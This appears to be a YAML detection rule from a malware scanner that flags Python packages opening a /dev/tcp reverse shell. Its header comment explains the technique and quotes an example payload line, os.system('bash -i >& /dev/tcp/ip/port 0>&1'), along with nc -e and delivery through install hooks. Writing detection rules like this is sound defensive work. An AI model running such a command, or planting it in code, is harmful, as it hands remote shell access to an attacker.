# A /dev/tcp reverse shell reached from Python. Sibling to the shell/csharp
# files here, which describe the same primitive in other carriers.
#
# `/dev/tcp/<host>/<port>` is a bash feature, not a real device -- writing to
# it opens a TCP connection -- so a string naming one is only meaningful as
# part of a shell command that redirects a shell's I/O through it. Paired with
# an interactive shell (`bash -i`) or `nc -e`, that is a reverse shell: the
# process hands its stdin/stdout to a socket the operator listens on. Nothing
# else constructs that string.
#
# The Python wrapper is incidental -- `os.system('bash -i >& /dev/tcp/ip/port
# 0>&1')` -- but it is where these ship in a package, run at import or from an
# install hook, so the shell rules that read a `.sh` never see them.
defaults:
  platforms: [unix]
  for: [python]
  attack: "T1059.004,T1071.001"
  mbc: "B0022"

composite_rules:
  - id: python-dev-tcp-reverse-shell
    desc: Python opens a /dev/tcp reverse shell
    crit: hostile
    conf: 0.97
    all:
      - id: objectives/execution/interpreter/cmd/injection::python-dev-tcp-payload
    any:
      - id: micro-behaviors/process/create/shell/interactive::python-bash-interactive
      - id: micro-behaviors/communications/socket/netcat::nc
    unless:
      - id: metadata/package/testing/presence/harness::verified-python-test-file
